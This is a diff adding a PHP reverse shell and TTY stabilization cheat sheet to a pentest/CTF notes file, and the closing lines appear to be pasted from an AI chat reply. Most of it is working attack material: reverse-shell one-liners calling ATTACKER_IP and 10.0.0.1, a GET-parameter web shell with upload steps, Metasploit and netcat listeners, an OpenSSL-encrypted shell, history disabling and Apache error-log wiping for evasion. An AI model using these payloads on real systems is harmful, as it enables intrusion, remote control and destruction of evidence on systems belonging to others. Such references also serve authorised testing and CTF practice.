@@ -903,3 +903,164 @@ chmod 600 id_rsa && ssh -i id_rsa user@target
 ```
 
 </details>
+
+<details>
+  <summary>
+
+  # Advanced PHP Reverse Shells & TTY Stabilization
+
+  </summary>
+
+
+
+---
+
+*(Pentest/Bug Bounty/CTF Field Manual)*  
+
+## **1. PHP Reverse Shell Techniques**
+### **A. Basic Reverse Shell (One-Liner)**
+```bash
+php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+**Why Use This?**  
+- Minimal footprint, works on most PHP-enabled systems  
+- Bypasses restrictive environments where full shells are blocked  
+
+### **B. Advanced Proc_Open Variant**
+```bash
+php -r '$sock=fsockopen("10.0.0.1",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+```
+**Advantages:**  
+- More reliable for complex interactions  
+- Better handling of I/O streams  
+
+### **C. Web Shell Integration**
+```php
+<?php system($_GET['cmd']); ?>
+```
+**Deployment:**  
+1. Upload to vulnerable web directory (e.g., `/uploads/shell.php`)  
+2. Execute commands via:  
+   ```http
+   http://target.com/uploads/shell.php?cmd=whoami
+   ```
+
+---
+
+## **2. Listener Configuration**
+### **Netcat (Basic)**
+```bash
+nc -nvlp 4444
+```
+**Pro Tip:** Use `-v` for verbose mode to confirm connections.
+
+### **Multi-Handler (Recommended)**
+```bash
+# In Metasploit:
+msf6 > use multi/handler
+msf6 > set payload php/reverse_php
+msf6 > set LHOST YOUR_IP
+msf6 > set LPORT 4444
+msf6 > exploit
+```
+**Benefits:**  
+- Auto-handles session restoration if disconnected  
+- Built-in logging  
+
+---
+
+## **3. TTY Stabilization Methods**
+### **A. Python (Gold Standard)**
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+**Follow-up:**  
+```bash
+CTRL+Z  # Background the shell
+stty raw -echo; fg  # Enable raw mode
+export TERM=xterm  # Enable full terminal features
+```
+
+### **B. Alternatives When Python Unavailable**
+| Command | Use Case |
+|---------|----------|
+| `script -qc /bin/bash /dev/null` | Systems with `script` binary |
+| `socat exec:'bash -li' pty,stderr,setsid,sigint,sane` | Requires socat installation |
+| `perl -e 'exec "/bin/bash";'` | Perl-based systems |
+
+### **C. Full Upgrade Sequence**
+1. Spawn TTY  
+2. Set terminal type:  
+   ```bash
+   export TERM=xterm-256color
+   ```
+3. Fix stty:  
+   ```bash
+   stty rows 55 columns 238  # Adjust to your terminal size
+   ```
+
+---
+
+## **4. OPSEC Considerations**
+### **A. Clean Execution**
+```bash
+# Disable history in current session
+unset HISTFILE
+```
+
+### **B. Log Evasion**
+```bash
+# Overwrite PHP error logs after exploit
+echo "" > /var/log/apache2/error.log
+```
+
+### **C. Traffic Obfuscation**
+```bash
+# Encrypted reverse shell (OpenSSL)
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_IP:4444 > /tmp/s; rm /tmp/s
+```
+
+---
+
+## **5. Troubleshooting Guide**
+| Issue | Solution |
+|-------|----------|
+| **Shell dies immediately** | Use `while true; do nc -lvp 4444; done` on listener |
+| **No Python/socat** | Try `awk 'BEGIN {system("/bin/bash")}'` |
+| **Firewall blocking** | Use common ports (80, 443) or ICMP/DNS tunneling |
+
+---
+
+## **6. Real-World Applications**
+### **Bug Bounty**  
+- Use in blind RCE scenarios (e.g., Log4j exploits)  
+- Combine with SSRF to pivot internally  
+
+### **CTF Challenges**  
+- Bypass restricted shells via PHP wrappers:  
+  ```bash
+  php -r "include('data://text/plain,<?php system(\$_GET[\"cmd\"]) ?>');"
+  ```
+
+### **Pentest Engagements**  
+- Chain with credential theft:  
+  ```bash
+  php -r 'echo file_get_contents("/etc/passwd");'
+  ```
+
+---
+
+## **7. Reference Cheatsheet**
+```markdown
+1. Start Listener:    `nc -nvlp 4444`
+2. PHP Shell:        `php -r '$s=fsockopen("IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`
+3. Stabilize:        `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+4. Full Upgrade:     `export TERM=xterm; stty raw -echo; fg`
+```
+
+---
+
+**Pro Tip:** Bookmark this guide and save the cheatsheet as `shells.txt` in your toolkit. For a **PDF version** with clickable TOC, reply "PDF please"!  
+
+Need Windows reverse shell equivalents? Let me know. 🚀
+</details>
